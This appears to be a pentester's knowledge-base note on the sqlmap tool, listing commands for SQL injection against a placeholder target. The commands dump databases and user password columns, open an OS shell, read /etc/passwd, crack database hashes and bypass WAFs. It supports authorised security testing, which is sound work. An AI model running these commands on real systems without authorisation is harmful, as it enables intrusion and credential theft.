---
summary: sqlmap — automate SQLi detection/exploitation from a request, dump databases, get a shell.
status: active
tags: [security, tools, sqlmap, web]
private: false
---

# sqlmap

Automates SQL injection once you've found (or suspect) an injectable parameter. Feed it a raw request from Burp for accuracy.

## Feed it a target

```bash
sqlmap -u 'http://$IP/page?id=1' --batch                 # GET param
sqlmap -u 'http://$IP/login' --data 'user=a&pass=b'       # POST body
sqlmap -r req.txt                                         # saved Burp request (best)
sqlmap -u '...' --cookie 'PHPSESSID=...' --level 5 --risk 3
```

- Mark the injection point with `*`: `-u 'http://$IP/item/1*'`.
- `--level` (1–5, more tests/headers) · `--risk` (1–3, heavier payloads).

## Enumerate → dump

```bash
sqlmap -r req.txt --dbs                        # list databases
sqlmap -r req.txt -D appdb --tables
sqlmap -r req.txt -D appdb -T users --columns
sqlmap -r req.txt -D appdb -T users -C user,pass --dump
sqlmap -r req.txt --dump-all --exclude-sysdbs  # everything app-owned
```

## Escalate

```bash
sqlmap -r req.txt --os-shell            # OS shell (needs stacked queries + FILE priv/writable webroot)
sqlmap -r req.txt --sql-shell           # interactive SQL
sqlmap -r req.txt --file-read=/etc/passwd
sqlmap -r req.txt --passwords           # dump + attempt crack DB user hashes
```

## Useful flags

- `--dbms=mysql` skip fingerprinting · `--technique=BEUSTQ` pick methods · `--tamper=space2comment,between` WAF bypass · `--threads 10` · `--proxy http://127.0.0.1:8080` (watch in Burp) · `--flush-session` reset.

## Related

- [sqlmap tool index](kb://11-security-tools-tools-index)
- [SQL Injection payloads](kb://11-security-payloads-sqli-payloads)
- [Web Application Testing](kb://11-security-playbook-web-app-testing)
